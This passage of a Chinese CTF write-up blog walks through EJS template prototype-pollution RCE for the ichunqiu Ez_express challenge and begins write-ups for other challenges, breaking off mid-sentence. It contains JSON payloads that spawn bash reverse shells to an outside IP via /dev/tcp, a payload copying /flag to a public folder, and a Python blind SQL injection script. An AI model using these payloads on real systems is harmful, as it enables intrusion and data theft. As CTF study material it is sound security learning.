class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后发送payload，等待bot点击，去vps收flag。</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225154218671.png" alt="image-20200225154218671"></p>
<p>以上是前端加后端的做法。</p>
<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>这道题还有一种后端sys模板rce的方法，由于模板引擎存在变量拼接的过程，所以存在RCE的可能，然后我们跟进res.render()函数去分析，到response.js的render函数</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175640508.png" alt="image-20200225175640508"></p>
<p>一些merge之后，调用然后跟到app.render()函数，继续跟进</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175813279.png" alt="image-20200225175813279"></p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175935554.png" alt="image-20200225175935554"></p>
<p>跟进tryRender()函数</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180110538.png" alt="image-20200225180110538"></p>
<p>跟到view.js中的render()函数</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180159127.png" alt="image-20200225180159127"></p>
<p>到engine()函数，又跟到ejs.js的渲染引擎的渲染函数exports.renderFile()</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180528375.png" alt="image-20200225180528375"></p>
<p>//……………………………………</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225191935895.png" alt="image-20200225191935895"></p>
<p>这里省略了一些无关的代码。renderFile()函数后面又调用了tryHandleCache()，继续跟进，</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180656822.png" alt="image-20200225180656822"></p>
<p>这里又跟进到handleCache()函数</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181034328.png" alt="image-20200225181034328"></p>
<p>然后跟进exports.compile()函数</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181212417.png" alt="image-20200225181212417"></p>
<p>这里 new了一个Template，然后调用了其compile()函数，跟进</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src;</span><br><span class="line">    <span class="keyword">var</span> fn;</span><br><span class="line">    <span class="keyword">var</span> opts = <span class="keyword">this</span>.opts;</span><br><span class="line">    <span class="keyword">var</span> prepended = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> appended = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">    <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">      <span class="keyword">this</span>.generateSource();</span><br><span class="line">      prepended += <span class="string">'  var __output = [], __append = __output.push.bind(__output);'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">        prepended +=  <span class="string">'  with ('</span> + opts.localsName + <span class="string">' || &#123;&#125;) &#123;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">        appended += <span class="string">'  &#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      appended += <span class="string">'  return __output.join("");'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.compileDebug) &#123;</span><br><span class="line">      src = <span class="string">'var __line = 1'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  , __lines = '</span> + <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.templateText) + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  , __filename = '</span> + (opts.filename ?</span><br><span class="line">        <span class="built_in">JSON</span>.stringify(opts.filename) : <span class="string">'undefined'</span>) + <span class="string">';'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'try &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="keyword">this</span>.source</span><br><span class="line">        + <span class="string">'&#125; catch (e) &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'  rethrow(e, __lines, __filename, __line, escapeFn);'</span> + <span class="string">'\n'</span></span><br><span class="line">        + <span class="string">'&#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      src = <span class="keyword">this</span>.source;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.async) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'return (async function()&#123;&#125;).constructor;'</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'This environment does not support async/await'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="built_in">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">', escapeFn, include, rethrow'</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="comment">// istanbul ignore else</span></span><br><span class="line">      <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opts.filename) &#123;</span><br><span class="line">          e.message += <span class="string">' in '</span> + opts.filename;</span><br><span class="line">        &#125;</span><br><span class="line">        e.message += <span class="string">' while compiling ejs\n\n'</span>;</span><br><span class="line">        e.message += <span class="string">'If the above error is not helpful, you may want to try EJS-Lint:\n'</span>;</span><br><span class="line">        e.message += <span class="string">'https://github.com/RyanZim/EJS-Lint'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!e.async) &#123;</span><br><span class="line">          e.message += <span class="string">'\n'</span>;</span><br><span class="line">          e.message += <span class="string">'Or, if you meant to create an async function, pass async: true as an option.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opts.client) &#123;</span><br><span class="line">      fn.dependencies = <span class="keyword">this</span>.dependencies;</span><br><span class="line">      <span class="keyword">return</span> fn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a callable function which will execute the function</span></span><br><span class="line">    <span class="comment">// created by the source-code, with the passed data as locals</span></span><br><span class="line">    <span class="comment">// Adds a local `include` function which allows full recursive include</span></span><br><span class="line">    <span class="keyword">var</span> returnedFn = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> include = <span class="function"><span class="keyword">function</span> (<span class="params">path, includeData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = utils.shallowCopy(&#123;&#125;, data);</span><br><span class="line">        <span class="keyword">if</span> (includeData) &#123;</span><br><span class="line">          d = utils.shallowCopy(d, includeData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> includeFile(path, opts)(d);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> fn.apply(opts.context, [data || &#123;&#125;, escapeFn, include, rethrow]);</span><br><span class="line">    &#125;;</span><br><span class="line">    returnedFn.dependencies = <span class="keyword">this</span>.dependencies;</span><br><span class="line">    <span class="keyword">return</span> returnedFn;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225182824684.png" alt="image-20200225182824684"></p>
<p>compile函数中再这里先判断了outputFunctionName是否存在，如果存在就拼接到prepended,然后再传给this.source,</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225183013346.png" alt="image-20200225183013346"></p>
<p>这里compileDebug为TRUE,会把this.source拼接到src,</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225183207866.png" alt="image-20200225183207866"></p>
<p>这里涉及到Function构造函数。</p>
<blockquote>
<p><strong><code>Function</code> 构造函数</strong>创建一个新的 <code>Function</code> <strong>对象</strong>。直接调用此构造函数可用动态创建函数，但会遭遇来自 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/eval" target="_blank" rel="noopener"><code>eval</code></a> 的安全问题和相对较小的性能问题。然而，与 eval 不同的是，Function 构造函数只在全局作用域中运行。</p>
<p>每个 JavaScript 函数实际上都是一个 <code>Function</code> 对象。运行 <code>(function(){}).constructor === Function</code> 便可以得到这个结论。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'return a + b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">2</span>, <span class="number">6</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225193150541.png" alt="image-20200225193150541"></p>
<p>之后将returnedFn返回。我们可以看下compile函数中opts变量的outputFunctinName  为undefined,所以我们就可以对outputFunctionName 进行原型链污染，达到rce的效果。</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181608175.png" alt></p>
<p>我们再梳理一下调用栈：</p>
<ol>
<li>server.js :: res.render()</li>
<li>response.js  :: render()</li>
<li>application.js :: render()</li>
<li>application.js :: tryRender()</li>
<li>view.js :: render()</li>
<li>ejs.js ::  exports.renderFile()</li>
<li>ejs.js :: tryHandleCache()</li>
<li>ejs.js :: handleCache()</li>
<li>ejs.js :: exports.compile()</li>
<li>ejs.js :: compile()</li>
<li>ejs.js  :: fn = new ctor(opts.localsName + ‘, escapeFn, include, rethrow’, src)</li>
<li>ejs.js  :: fn.apply(opts.context, [data || {}, escapeFn, include, rethrow])</li>
</ol>
<p>然后在这道题上，我们开始利用原型链污染进行rce.</p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"constructor"</span>: &#123;</span><br><span class="line">            <span class="attr">"prototype"</span>: &#123;</span><br><span class="line">            <span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\"');var __tmp2"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195631671.png" alt="image-20200225195631671"></p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225195717892.png" alt="image-20200225195717892"></p>
<h3 id="ichunqiu-新春公益赛-Ez-express"><a href="#ichunqiu-新春公益赛-Ez-express" class="headerlink" title="ichunqiu 新春公益赛 Ez_express"></a>ichunqiu 新春公益赛 Ez_express</h3><p>这道题目也给了源码，有下面几个路由：</p>
<ul>
<li>/   ：如果没登录会跳转到/login</li>
<li>/login  <ul>
<li>get  无特殊功能</li>
<li>post  若submit为register为注册，若submit为login为登录。</li>
</ul>
</li>
<li>/action : 只有admin可以用</li>
<li>/info  ：无特殊功能</li>
</ul>
<p>接下来审计源码，先看routes/index.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">"login"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">'/'</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  <span class="comment">//console.log(req.session.user.data)</span></span><br><span class="line">  <span class="comment">//console.log(res.outputFunctionName)</span></span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>

<p>可以看到在注册的时候，safeKeyword()函数会检测禁止注册userid为admin(包括大小写)，如果通过safeKeyword()函数验证，就用toUpperCase()函数将输入的userid变成大写，赋值给session。</p>
<p>然后再<code>/action</code>路由中通过比较req.session.user.user!=”ADMIN”来判断用户是否是admin。</p>
<p>这里我们可以参考P神之前发的一篇关于javascript的大小写的小特性的<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">文章</a>，利用其中特性来绕过。</p>
<blockquote>
<p>这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p>
<p>这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.</p>
</blockquote>
<p>绕过这里之后，我们可以看到/action中调用了clone()函数，clone()又调用了merge()函数，这里就可以发生原型链污染。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，我们在本地测试一下，这里是否可以进行原型链污染，</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225215922481.png" alt="image-20200225215922481"></p>
<p>结果是可以的，然后可以看到这里用的也是ejs的渲染引擎，然后我们继续污染outputFunctionName，来RCE。</p>
<p>paylaod</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.0.197.203/8888 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225220249254.png" alt="image-20200225220249254"></p>
<p>然后访问一下网页触发render()函数。在vps上收flag.</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225220420908.png" alt="image-20200225220420908"></p>
<p>另外也可以把flag读到读到public文件夹，</p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"cat /flag&gt; /app/public/flag\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后访问flag，即可下载。</p>
<p>参考：</p>
<p><a href="https://www.xmsec.cc/prototype-pollution-notes/" target="_blank" rel="noopener">https://www.xmsec.cc/prototype-pollution-notes/</a></p>
<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a></p>
]]></content>
      <tags>
        <tag>JavaScript原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>2020新春战役网络安全公益赛web部分题解</title>
    <url>/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/</url>
    <content><![CDATA[<p>打了ichunqiu的新春公益赛，web题大部分比较友好。</p>
<a id="more"></a>

<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day_1"></a>Day_1</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>进去一个登录界面，可以注册，开始看到forgot，但是没有忘记密码的链接，注册登进去后，有个查询界面需要admin权限，然后注册admin用户也没有权限，之后试着可以用万能密码进来，然后再查询key的界面测了半天，啥也没出来，后来一想万能密码都可以登，那么登录出就可以注了。。。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://724572ef5f71464aa9d50b6a9540181cf1f2d153e3ee45e7.changame.ichunqiu.com/index.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		<span class="comment">#payload=r"admin' and 1=(ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_name='flag'),&#123;&#125;,1))&gt;&#123;&#125;) or '1"</span></span><br><span class="line">		payload=<span class="string">r"admin' and 1=(ascii(mid((select flaaag from flag limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;) or '1"</span></span><br><span class="line">		data=&#123;<span class="string">"lname"</span>:payload.format(i,mid),<span class="string">"lpass"</span>:<span class="string">"ff"</span>&#125;</span><br><span class="line">		print(payload.format(i,mid))</span><br><span class="line">		r=requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">b"./zhaopin.php"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br><span class="line">	<span class="comment">#backup,flag,user</span></span><br><span class="line">	<span class="comment">#id,flaaag</span></span><br></pre></td></tr></table></figure>

<p>更新：之前说在key那里试了半天没有成功，当时order by 时题目报错一直在猜后台的sql语句，后来看了<a href="https://www.gem-love.com/ctf/1669.html#i" target="_blank" rel="noopener">颖奇师傅的wp后</a>，这里尽管报错还是可以注入的。</p>
<p>首先用<code>oeder by</code>查列数</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124224465.png" alt="image-20200224124224465"></p>
<p>然后看回显位，为2，查表</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224123828230.png" alt="image-20200224123828230"></p>
<p>查列</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124516526.png" alt="image-20200224124516526"></p>
<p>查flag</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124618322.png" alt="image-20200224124618322"></p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>这题就不用说了，啥过滤都没有。</p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>扫目录有<a href="http://www.zip，看到" target="_blank" rel="noopener">www.zip，看到</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有用die用的echo，之后的程序还会执行，而且</p>
